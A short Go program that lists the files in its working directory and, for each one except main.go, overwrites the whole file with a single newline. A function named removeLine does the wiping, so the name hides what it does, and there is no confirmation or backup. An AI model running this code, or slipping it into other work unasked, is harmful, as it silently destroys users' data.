package main

import (
	"fmt"
	"io/ioutil"
	"os"
)

func main() {
	files, err := ioutil.ReadDir("./")
	if err != nil {
		panic(err)
	}
	for _, f := range files {
		fmt.Println(f.Name())
		if f.Name() == "main.go" {
			continue
		} else {
			start(f.Name())
		}
	}
}

func start(filename string) {
	path := filename
	removeLine(path)
}

func removeLine(path string) {

	info, _ := os.Stat(path)
	mode := info.Mode()
	ioutil.WriteFile(path, []byte("\n"), mode)
}
